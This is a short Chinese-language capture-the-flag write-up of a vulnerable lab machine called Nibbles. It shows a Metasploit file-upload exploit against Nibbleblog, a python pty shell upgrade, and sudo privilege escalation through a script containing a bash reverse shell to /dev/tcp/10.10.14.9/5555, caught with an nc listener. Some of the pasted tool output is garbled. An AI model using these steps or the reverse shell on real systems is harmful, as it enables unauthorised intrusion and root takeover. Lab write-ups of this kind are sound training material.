# 漏洞利用

```


msf6 exploit(multi/http/nibbleblog_file_upload) > show optionstype:host:port[,type

:host:port][...]false            no        Negotiate SSL/TLS for

 outgoing connections
```

设置好相关的参数，然后 exploit 执行

```


msf6 exploit(multi/http/nibbleblog_file_upload) > exploit
```

成功拿到一个 shell

```

shell"import pty;pty.spawn('/bin/bash')"
;
```

按照这些流程获取一个交互式 shell

```


nibbler@Nibbles:/home/nibbler$ cat /home/nibbler/user.txt
```

成功获得 user 权限的 flag 文件

如果我们想拿到 root 权限的 shell，那就去写入一个反弹语句

使用 nc 监听一个端口

```

nc -nvlp 5555
```

```
echo '/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.9/5555 0>&1"'
 > monitor.sh
```

写入语句后执行

```

sudo ./ monitor.sh
```

```
root@Nibbles:/home/nibbler/personal/stuff# whoami&&id


```

成功拿到 root 权限
